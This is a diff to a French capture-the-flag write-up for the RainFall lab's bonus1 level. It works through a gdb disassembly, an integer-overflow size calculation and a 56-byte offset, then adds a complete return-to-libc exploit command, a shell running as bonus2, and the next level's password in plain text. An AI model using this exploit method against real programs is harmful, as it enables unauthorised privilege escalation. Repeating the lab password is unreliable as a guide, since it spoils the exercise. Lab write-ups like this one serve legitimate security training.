@@ -23,12 +23,12 @@ pas la taille du buffer, un bufferoverflow est donc envisageable.
 Regardons le <main> de plus prés :
 ____________________________________________________________________________________________________________________________________________________________________
 
-(gdb) disas main                                                |
-Dump of assembler code for function main:                       |
-   0x08048424 <+0>:	push   %ebp                             |
-   0x08048425 <+1>:	mov    %esp,%ebp                        |
-   0x08048427 <+3>:	and    $0xfffffff0,%esp                 |
-   0x0804842a <+6>:	sub    $0x40,%esp                       |
+(gdb) disas main                                                
+Dump of assembler code for function main:                       
+   0x08048424 <+0>:	push   %ebp                             
+   0x08048425 <+1>:	mov    %esp,%ebp                        
+   0x08048427 <+3>:	and    $0xfffffff0,%esp                 
+   0x0804842a <+6>:	sub    $0x40,%esp                      
    
    ----------------------------------------------------------------------------------------------------------------------------------------------------------------
    
@@ -104,7 +104,7 @@ On a donc :
 On déduis :
 (-2147483648 + 20) * 4 = 80
 
-On a alors noter 1er arg = -2147483628  ce qui nous permettra de copier 80 caractères
+On a alors noter 1er arg = -2147483628  ce qui nous permettra de copier 80 caractères (nous prenons 80 ++large que 64 par précaution) 
 
 Determinons l'offset de notre notre buffer : (https://wiremask.eu/tools/buffer-overflow-pattern-generator/?)
 On trouve OFFSET -- > 56
@@ -118,6 +118,12 @@ Nous allons pouvoir monter notre exploit pour ce faire il nous faut
 
 Ce qui nous donne l'exploit suivante :
 
->$ bonus1@RainFall:~$ ./bonus1 -2147483628 $(pythonc -c 'print("A" * 56 + "\x60\xb0\xe6\xb7" + DUMM + "\x83\x85\x04\x08")')
-   
+>$ bonus1@RainFall:~$ ./bonus1 -2147483628 $(python -c 'print("A" * 56 + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\x57" + "\x83\x85\x04\x08")')
+  $ whoami
+  bonus2
+  $ cat /home/user/bonus2/.pass
+  579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+
+Next ...
+
 
